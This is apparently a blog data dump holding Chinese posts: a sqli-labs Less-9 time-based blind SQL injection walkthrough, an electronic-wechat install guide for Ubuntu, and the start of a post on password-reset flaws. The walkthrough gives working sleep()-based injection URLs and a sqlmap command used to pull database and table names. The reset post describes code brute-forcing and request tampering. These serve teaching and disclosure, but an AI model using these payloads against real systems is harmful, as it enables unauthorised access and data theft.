if(116<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n116:True\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(120<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n120:False\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(118<=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n118:False\n\n`http://10.60.250.151/sqlilabs/Less-9/?id=1' and if(117=ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),1,1)),sleep(60),null)%23`\n\n117:True\n\n117的ascii码为`u`,第4张表的第一个字符为`u`。\n\n剩下的过程就不写了。都是相同的原里,把要查询的东西填到`if(1,2,3)`的1中就行了。\n\n## SQLMAP ##\n\n`sqlmap -u 10.60.250.151/sqlilabs/Less-9/?id=1 --technique T --dbs`\n\n--technique T:表示测试时间延迟注入、\n\n这种方式需要大量的时间\n\n![10](/img/sql/Lesson-9/10.png)\n\n![11](/img/sql/Lesson-9/11.png)\n\n剩下的就不表了。","slug":"sqli-labs-lession-9-GET单引号基于时间盲注","published":1,"updated":"2019-06-19T17:23:13.400Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istg6007g4dsbpknkq1do","content":"<h1 id=\"sqli-labs-lession-9-GET单引号基于时间盲注\"><a href=\"#sqli-labs-lession-9-GET单引号基于时间盲注\" class=\"headerlink\" title=\"sqli-labs-lession 9 GET单引号基于时间盲注\"></a>sqli-labs-lession 9 GET单引号基于时间盲注</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-9/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"时间盲注函数\"><a href=\"#时间盲注函数\" class=\"headerlink\" title=\"时间盲注函数\"></a>时间盲注函数</h3><ul>\n<li><p>sleep()函数</p>\n<p>  sleep(n):静止n秒,n是个变量</p>\n</li>\n<li><p>if(1,2,3)</p>\n<p>  如果1为真,执行2,否则执行3</p>\n</li>\n</ul>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>在这个页面的<code>?id=1</code>后写入任何数据都没有结果返回,永远都是<code>You are in...........</code>的界面。</p>\n<p>利用if函数来判断类型。</p>\n<p>先查看源码</p>\n<p><img src=\"/img/sql/Lesson-9/2.png\" alt=\"2\"></p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>\n<p>注意到源码是单引号闭合的。并且无论数据库语句执行成功失败都不会返回信息。</p>\n<p>可是如果我传入一个用if函数构造的语句</p>\n<p><code>1&#39; and if(1,sleep(60),null)#</code></p>\n<p>SQL语句会变成</p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39; and if(1,sleep(60),null) #&#39; LIMIT 0,1&quot;;</code></p>\n<p>如果被数据库成功解析,就会执行<code>sleep(60)</code>,页面就会转60s,即证明$id<br>被一个<code>&#39;&#39;</code>包起来。</p>\n<p>测试一下。</p>\n<p><img src=\"/img/sql/Lesson-9/3.png\" alt=\"3\"></p>\n<p>可以发现左上角一直在转,果然是单引号闭合的时间盲注。</p>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><h4 id=\"获取数据库长度\"><a href=\"#获取数据库长度\" class=\"headerlink\" title=\"获取数据库长度\"></a>获取数据库长度</h4><p><img src=\"/img/sql/Lesson-9/4.png\" alt=\"4\"></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(8=(length(database())),sleep(60),null)%23</code></p>\n<h4 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h4><p>猜第一个字符</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(&#39;s&#39;=left(database(),1),sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-9/5.png\" alt=\"5\"></p>\n<p>猜第二个</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(&#39;se&#39;=left(database(),2),sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-9/6.png\" alt=\"6\"></p>\n<p>中间省略了,可以用其他的方式,推荐二分法</p>\n<p>最后猜解出数据库名</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(&#39;security&#39;=left(database(),8),sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-9/7.png\" alt=\"7\"></p>\n<p>数据库名为<code>security</code></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><h4 id=\"表数目\"><a href=\"#表数目\" class=\"headerlink\" title=\"表数目\"></a>表数目</h4><p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(4=(select count(table_name) from information_schema.tables where table_schema=&#39;security&#39;),sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-9/8.png\" alt=\"8\"></p>\n<h4 id=\"表长度\"><a href=\"#表长度\" class=\"headerlink\" title=\"表长度\"></a>表长度</h4><p>以获取第一张表为例(第一张表是emails,玩旧了都记住了):</p>\n<p>又在一直转了,说明第一张表长度为6。</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(6=length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-9/9.png\" alt=\"9\"></p>\n<h4 id=\"表名\"><a href=\"#表名\" class=\"headerlink\" title=\"表名\"></a>表名</h4><p>这里过一遍二分法吧,免得忘了。一般从ascii码95~123。</p>\n<p>True表示页面加载,False表示不加载。用第4张表(其实我知道是users表)测试。</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(95&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>95:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(109&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>109:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(116&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>116:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(120&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>120:False</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(118&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>118:False</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(117=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>117:True</p>\n<p>117的ascii码为<code>u</code>,第4张表的第一个字符为<code>u</code>。</p>\n<p>剩下的过程就不写了。都是相同的原里,把要查询的东西填到<code>if(1,2,3)</code>的1中就行了。</p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u 10.60.250.151/sqlilabs/Less-9/?id=1 --technique T --dbs</code></p>\n<p>–technique T:表示测试时间延迟注入、</p>\n<p>这种方式需要大量的时间</p>\n<p><img src=\"/img/sql/Lesson-9/10.png\" alt=\"10\"></p>\n<p><img src=\"/img/sql/Lesson-9/11.png\" alt=\"11\"></p>\n<p>剩下的就不表了。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-9-GET单引号基于时间盲注\"><a href=\"#sqli-labs-lession-9-GET单引号基于时间盲注\" class=\"headerlink\" title=\"sqli-labs-lession 9 GET单引号基于时间盲注\"></a>sqli-labs-lession 9 GET单引号基于时间盲注</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-9/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"时间盲注函数\"><a href=\"#时间盲注函数\" class=\"headerlink\" title=\"时间盲注函数\"></a>时间盲注函数</h3><ul>\n<li><p>sleep()函数</p>\n<p>  sleep(n):静止n秒,n是个变量</p>\n</li>\n<li><p>if(1,2,3)</p>\n<p>  如果1为真,执行2,否则执行3</p>\n</li>\n</ul>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>在这个页面的<code>?id=1</code>后写入任何数据都没有结果返回,永远都是<code>You are in...........</code>的界面。</p>\n<p>利用if函数来判断类型。</p>\n<p>先查看源码</p>\n<p><img src=\"/img/sql/Lesson-9/2.png\" alt=\"2\"></p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>\n<p>注意到源码是单引号闭合的。并且无论数据库语句执行成功失败都不会返回信息。</p>\n<p>可是如果我传入一个用if函数构造的语句</p>\n<p><code>1&#39; and if(1,sleep(60),null)#</code></p>\n<p>SQL语句会变成</p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;1&#39; and if(1,sleep(60),null) #&#39; LIMIT 0,1&quot;;</code></p>\n<p>如果被数据库成功解析,就会执行<code>sleep(60)</code>,页面就会转60s,即证明$id<br>被一个<code>&#39;&#39;</code>包起来。</p>\n<p>测试一下。</p>\n<p><img src=\"/img/sql/Lesson-9/3.png\" alt=\"3\"></p>\n<p>可以发现左上角一直在转,果然是单引号闭合的时间盲注。</p>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><h4 id=\"获取数据库长度\"><a href=\"#获取数据库长度\" class=\"headerlink\" title=\"获取数据库长度\"></a>获取数据库长度</h4><p><img src=\"/img/sql/Lesson-9/4.png\" alt=\"4\"></p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(8=(length(database())),sleep(60),null)%23</code></p>\n<h4 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h4><p>猜第一个字符</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(&#39;s&#39;=left(database(),1),sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-9/5.png\" alt=\"5\"></p>\n<p>猜第二个</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(&#39;se&#39;=left(database(),2),sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-9/6.png\" alt=\"6\"></p>\n<p>中间省略了,可以用其他的方式,推荐二分法</p>\n<p>最后猜解出数据库名</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(&#39;security&#39;=left(database(),8),sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-9/7.png\" alt=\"7\"></p>\n<p>数据库名为<code>security</code></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><h4 id=\"表数目\"><a href=\"#表数目\" class=\"headerlink\" title=\"表数目\"></a>表数目</h4><p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(4=(select count(table_name) from information_schema.tables where table_schema=&#39;security&#39;),sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-9/8.png\" alt=\"8\"></p>\n<h4 id=\"表长度\"><a href=\"#表长度\" class=\"headerlink\" title=\"表长度\"></a>表长度</h4><p>以获取第一张表为例(第一张表是emails,玩旧了都记住了):</p>\n<p>又在一直转了,说明第一张表长度为6。</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(6=length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-9/9.png\" alt=\"9\"></p>\n<h4 id=\"表名\"><a href=\"#表名\" class=\"headerlink\" title=\"表名\"></a>表名</h4><p>这里过一遍二分法吧,免得忘了。一般从ascii码95~123。</p>\n<p>True表示页面加载,False表示不加载。用第4张表(其实我知道是users表)测试。</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(95&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>95:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(109&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>109:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(116&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>116:True</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(120&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>120:False</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(118&lt;=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>118:False</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-9/?id=1&#39; and if(117=ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)),sleep(60),null)%23</code></p>\n<p>117:True</p>\n<p>117的ascii码为<code>u</code>,第4张表的第一个字符为<code>u</code>。</p>\n<p>剩下的过程就不写了。都是相同的原里,把要查询的东西填到<code>if(1,2,3)</code>的1中就行了。</p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u 10.60.250.151/sqlilabs/Less-9/?id=1 --technique T --dbs</code></p>\n<p>–technique T:表示测试时间延迟注入、</p>\n<p>这种方式需要大量的时间</p>\n<p><img src=\"/img/sql/Lesson-9/10.png\" alt=\"10\"></p>\n<p><img src=\"/img/sql/Lesson-9/11.png\" alt=\"11\"></p>\n<p>剩下的就不表了。</p>\n"},{"title":"wechat-ubuntu18.04","date":"2018-11-03T09:22:01.000Z","_content":"\n# 安装wechat(ubuntu18.04)\n\n---\n\n## 0x00\n\n之前在`https://github.com/geeeeeeeeek/electronic-wechat`下载使用的微信会有一些问题,退出后就无法唤醒，但是后台还有进程，只能使用kill命令杀死。决定重新安装下wechat。\n\n## 0x01\n\n`https://github.com/kooritea/electronic-wechat`\n\n```\ncd ~/Downloads/\ngit clone https://github.com/kooritea/electronic-wechat.git\n# 进入仓库\ncd electronic-wechat\n# 安装依赖, 运行应用\nnpm install && npm start\n# 打包linux应用 这里速度很慢,尝试了好几次\nnpm run build:linux\n```\n\n上述步骤操作完成后会在`~/Downloads/electronic-wechat`生产一个`dist`的目录,里面有打包好的文件`electronic-wechat-linux-x64`\n\n![001](/img/ubuntu/wechat-install/001.png)\n\n双击该文件就能打开wechat,但是这样不方便,每次都要到该目录,下面添加个快捷方式。\n\n## 0x02\n\n```\n# 拷贝到opt目录\nsudo cp -r ~/Downloads/electronic-wechat/dist/electronic-wechat-linux-x64 /opt/wechat\ncd /opt/wechat/electronic-wechat-linux-x64/\n# 给wechat配个图标\nsudo wget https://raw.githubusercontent.com/geeeeeeeeek/electronic-wechat/master/assets/icon.png\n# 确保electronic-wechat有执行权限\n```\n\n到/usr/share/applications目录下创建启动快捷方式\n\n```\ncd /usr/share/applications\nsudo vim wechat.desktop\n```\n\n编辑内容\n\n```\n[Desktop Entry]\nName=wechat\nType=Application\nExec=/opt/wechat/electronic-wechat-linux-x64/electronic-wechat\nIcon=/opt/wechat/electronic-wechat-linux-x64/icon.png\nTerminal=false\n```\n\nExec对应要执行的程序,Icon对应图标。\n\n![002](/img/ubuntu/wechat-install/002.png)\n\n已经微信了,添加到收藏夹即可。\n\n\n\n\n\n","source":"_posts/wechat-ubuntu18-04.md","raw":"---\ntitle: wechat-ubuntu18.04\ndate: 2018-11-03 17:22:01\ntags: [疑难杂症]\ncategories: ubuntu\n---\n\n# 安装wechat(ubuntu18.04)\n\n---\n\n## 0x00\n\n之前在`https://github.com/geeeeeeeeek/electronic-wechat`下载使用的微信会有一些问题,退出后就无法唤醒，但是后台还有进程，只能使用kill命令杀死。决定重新安装下wechat。\n\n## 0x01\n\n`https://github.com/kooritea/electronic-wechat`\n\n```\ncd ~/Downloads/\ngit clone https://github.com/kooritea/electronic-wechat.git\n# 进入仓库\ncd electronic-wechat\n# 安装依赖, 运行应用\nnpm install && npm start\n# 打包linux应用 这里速度很慢,尝试了好几次\nnpm run build:linux\n```\n\n上述步骤操作完成后会在`~/Downloads/electronic-wechat`生产一个`dist`的目录,里面有打包好的文件`electronic-wechat-linux-x64`\n\n![001](/img/ubuntu/wechat-install/001.png)\n\n双击该文件就能打开wechat,但是这样不方便,每次都要到该目录,下面添加个快捷方式。\n\n## 0x02\n\n```\n# 拷贝到opt目录\nsudo cp -r ~/Downloads/electronic-wechat/dist/electronic-wechat-linux-x64 /opt/wechat\ncd /opt/wechat/electronic-wechat-linux-x64/\n# 给wechat配个图标\nsudo wget https://raw.githubusercontent.com/geeeeeeeeek/electronic-wechat/master/assets/icon.png\n# 确保electronic-wechat有执行权限\n```\n\n到/usr/share/applications目录下创建启动快捷方式\n\n```\ncd /usr/share/applications\nsudo vim wechat.desktop\n```\n\n编辑内容\n\n```\n[Desktop Entry]\nName=wechat\nType=Application\nExec=/opt/wechat/electronic-wechat-linux-x64/electronic-wechat\nIcon=/opt/wechat/electronic-wechat-linux-x64/icon.png\nTerminal=false\n```\n\nExec对应要执行的程序,Icon对应图标。\n\n![002](/img/ubuntu/wechat-install/002.png)\n\n已经微信了,添加到收藏夹即可。\n\n\n\n\n\n","slug":"wechat-ubuntu18-04","published":1,"updated":"2019-06-19T17:23:13.401Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istg8007k4dsbvu03d7zt","content":"<h1 id=\"安装wechat-ubuntu18-04\"><a href=\"#安装wechat-ubuntu18-04\" class=\"headerlink\" title=\"安装wechat(ubuntu18.04)\"></a>安装wechat(ubuntu18.04)</h1><hr>\n<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>之前在<code>https://github.com/geeeeeeeeek/electronic-wechat</code>下载使用的微信会有一些问题,退出后就无法唤醒，但是后台还有进程，只能使用kill命令杀死。决定重新安装下wechat。</p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p><code>https://github.com/kooritea/electronic-wechat</code></p>\n<figure class=\"highlight coffeescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~<span class=\"regexp\">/Downloads/</span></span><br><span class=\"line\">git clone https:<span class=\"regexp\">//gi</span>thub.com/kooritea/electronic-wechat.git</span><br><span class=\"line\"><span class=\"comment\"># 进入仓库</span></span><br><span class=\"line\">cd electronic-wechat</span><br><span class=\"line\"><span class=\"comment\"># 安装依赖, 运行应用</span></span><br><span class=\"line\"><span class=\"built_in\">npm</span> install &amp;&amp; <span class=\"built_in\">npm</span> start</span><br><span class=\"line\"><span class=\"comment\"># 打包linux应用 这里速度很慢,尝试了好几次</span></span><br><span class=\"line\"><span class=\"built_in\">npm</span> run build:linux</span><br></pre></td></tr></table></figure>\n\n<p>上述步骤操作完成后会在<code>~/Downloads/electronic-wechat</code>生产一个<code>dist</code>的目录,里面有打包好的文件<code>electronic-wechat-linux-x64</code></p>\n<p><img src=\"/img/ubuntu/wechat-install/001.png\" alt=\"001\"></p>\n<p>双击该文件就能打开wechat,但是这样不方便,每次都要到该目录,下面添加个快捷方式。</p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># 拷贝到opt目录</span></span><br><span class=\"line\">sudo cp -r ~/Downloads<span class=\"meta-keyword\">/electronic-wechat/</span>dist/electronic-wechat-linux-x64 <span class=\"meta-keyword\">/opt/</span>wechat</span><br><span class=\"line\">cd <span class=\"meta-keyword\">/opt/</span>wechat<span class=\"meta-keyword\">/electronic-wechat-linux-x64/</span></span><br><span class=\"line\"><span class=\"meta\"># 给wechat配个图标</span></span><br><span class=\"line\">sudo wget https:<span class=\"comment\">//raw.githubusercontent.com/geeeeeeeeek/electronic-wechat/master/assets/icon.png</span></span><br><span class=\"line\"><span class=\"meta\"># 确保electronic-wechat有执行权限</span></span><br></pre></td></tr></table></figure>\n\n<p>到/usr/share/applications目录下创建启动快捷方式</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cd</span> <span class=\"string\">/usr/share/applications</span></span><br><span class=\"line\">sudo vim wechat.desktop</span><br></pre></td></tr></table></figure>\n\n<p>编辑内容</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Desktop Entry]</span></span><br><span class=\"line\"><span class=\"attr\">Name</span>=wechat</span><br><span class=\"line\"><span class=\"attr\">Type</span>=Application</span><br><span class=\"line\"><span class=\"attr\">Exec</span>=/opt/wechat/electronic-wechat-linux-x64/electronic-wechat</span><br><span class=\"line\"><span class=\"attr\">Icon</span>=/opt/wechat/electronic-wechat-linux-x64/icon.png</span><br><span class=\"line\"><span class=\"attr\">Terminal</span>=<span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<p>Exec对应要执行的程序,Icon对应图标。</p>\n<p><img src=\"/img/ubuntu/wechat-install/002.png\" alt=\"002\"></p>\n<p>已经微信了,添加到收藏夹即可。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"安装wechat-ubuntu18-04\"><a href=\"#安装wechat-ubuntu18-04\" class=\"headerlink\" title=\"安装wechat(ubuntu18.04)\"></a>安装wechat(ubuntu18.04)</h1><hr>\n<h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>之前在<code>https://github.com/geeeeeeeeek/electronic-wechat</code>下载使用的微信会有一些问题,退出后就无法唤醒，但是后台还有进程，只能使用kill命令杀死。决定重新安装下wechat。</p>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><p><code>https://github.com/kooritea/electronic-wechat</code></p>\n<figure class=\"highlight coffeescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~<span class=\"regexp\">/Downloads/</span></span><br><span class=\"line\">git clone https:<span class=\"regexp\">//gi</span>thub.com/kooritea/electronic-wechat.git</span><br><span class=\"line\"><span class=\"comment\"># 进入仓库</span></span><br><span class=\"line\">cd electronic-wechat</span><br><span class=\"line\"><span class=\"comment\"># 安装依赖, 运行应用</span></span><br><span class=\"line\"><span class=\"built_in\">npm</span> install &amp;&amp; <span class=\"built_in\">npm</span> start</span><br><span class=\"line\"><span class=\"comment\"># 打包linux应用 这里速度很慢,尝试了好几次</span></span><br><span class=\"line\"><span class=\"built_in\">npm</span> run build:linux</span><br></pre></td></tr></table></figure>\n\n<p>上述步骤操作完成后会在<code>~/Downloads/electronic-wechat</code>生产一个<code>dist</code>的目录,里面有打包好的文件<code>electronic-wechat-linux-x64</code></p>\n<p><img src=\"/img/ubuntu/wechat-install/001.png\" alt=\"001\"></p>\n<p>双击该文件就能打开wechat,但是这样不方便,每次都要到该目录,下面添加个快捷方式。</p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># 拷贝到opt目录</span></span><br><span class=\"line\">sudo cp -r ~/Downloads<span class=\"meta-keyword\">/electronic-wechat/</span>dist/electronic-wechat-linux-x64 <span class=\"meta-keyword\">/opt/</span>wechat</span><br><span class=\"line\">cd <span class=\"meta-keyword\">/opt/</span>wechat<span class=\"meta-keyword\">/electronic-wechat-linux-x64/</span></span><br><span class=\"line\"><span class=\"meta\"># 给wechat配个图标</span></span><br><span class=\"line\">sudo wget https:<span class=\"comment\">//raw.githubusercontent.com/geeeeeeeeek/electronic-wechat/master/assets/icon.png</span></span><br><span class=\"line\"><span class=\"meta\"># 确保electronic-wechat有执行权限</span></span><br></pre></td></tr></table></figure>\n\n<p>到/usr/share/applications目录下创建启动快捷方式</p>\n<figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">cd</span> <span class=\"string\">/usr/share/applications</span></span><br><span class=\"line\">sudo vim wechat.desktop</span><br></pre></td></tr></table></figure>\n\n<p>编辑内容</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Desktop Entry]</span></span><br><span class=\"line\"><span class=\"attr\">Name</span>=wechat</span><br><span class=\"line\"><span class=\"attr\">Type</span>=Application</span><br><span class=\"line\"><span class=\"attr\">Exec</span>=/opt/wechat/electronic-wechat-linux-x64/electronic-wechat</span><br><span class=\"line\"><span class=\"attr\">Icon</span>=/opt/wechat/electronic-wechat-linux-x64/icon.png</span><br><span class=\"line\"><span class=\"attr\">Terminal</span>=<span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<p>Exec对应要执行的程序,Icon对应图标。</p>\n<p><img src=\"/img/ubuntu/wechat-install/002.png\" alt=\"002\"></p>\n<p>已经微信了,添加到收藏夹即可。</p>\n"},{"title":"任意用户密码重置","date":"2019-05-09T02:04:47.000Z","_content":"\n# 任意用户密码重置姿势\n\n## 0x00 前言\n\n这里记录一些实战中碰到的一些任意密码重置的案例。\n\n## 0x01 验证码暴力破解\n\n这类是最常见的任意密码重置问题了。由于服务端没有对访问做限制，同时验证码过多而且生存周期较长，导致可以爆破处验证码，对任意用户账号进行重置。\n\n在找回密码发送验证码后，填写任意验证码进行爆破。\n\n![0x01_1](/img/Web/20190509/0x01_1.png)\n\n爆破出验证码后即可重置密码\n\n​\t![0x01_2](/img/Web/20190509/0x01_2.png)\n\n## 0x02 验证码被返回\n\n### 验证码直接返回\n\n最常见的一类是验证码直接被返回给前端。如下图所示：\n\n![0x02_1_1](/img/Web/20190509/0x02_1_1.png)\n\n填写返回的验证码。\n\n![0x02_1_2](/img/Web/20190509/0x02_1_2.png)\n\n### 验证码返回在Cookie中\n\n![0x02_2_1](/img/Web/20190509/0x02_2_1.png)\n\n发送验证码并抓取返回包。发现返回包中设置的Cookie存在phoneCode字段:885042，猜测为验证码。输入验证码重置。修改成功。\n\n![0x02_2](/img/Web/20190509/0x02_2_2.png)\n\n![0x02_3](/img/Web/20190509/0x02_2_3.png)\n\n## 0x03 没有验证接受验证码的账号是否与被修改密码账号一致\n\n下面案例先用账号接受验证码后，再请求包中修改邮箱为受害者邮箱。\n\n![0x03_1](/img/Web/20190509/0x03_1.png)\n\n成功修改密码。\n\n![0x03_2](/img/Web/20190509/0x03_2.png)\n\n## 0x04 